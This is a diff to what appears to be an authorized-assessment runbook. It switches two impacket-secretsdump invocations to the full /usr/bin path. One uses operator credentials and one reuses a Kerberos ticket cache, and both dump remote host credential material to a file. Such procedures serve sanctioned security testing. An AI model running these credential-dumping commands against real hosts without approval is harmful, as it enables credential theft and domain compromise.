@@ -8,14 +8,14 @@ For an explicitly approved selected-host acquisition with those stages permitted
 
 ~~~bash
 umask 077
-impacket-secretsdump "$domain/$operator@$member_fqdn" -skip-security -outputfile "$output_prefix"
+/usr/bin/impacket-secretsdump "$domain/$operator@$member_fqdn" -skip-security -outputfile "$output_prefix"
 ~~~
 
 For an existing CIFS-compatible ticket, use the cache's actual hostname/SPN identity:
 
 ~~~bash
 export KRB5CCNAME="$cache"
-impacket-secretsdump -k -no-pass "$domain/$operator@$member_fqdn" \
+/usr/bin/impacket-secretsdump -k -no-pass "$domain/$operator@$member_fqdn" \
   -skip-security -outputfile "$output_prefix"
 ~~~
 
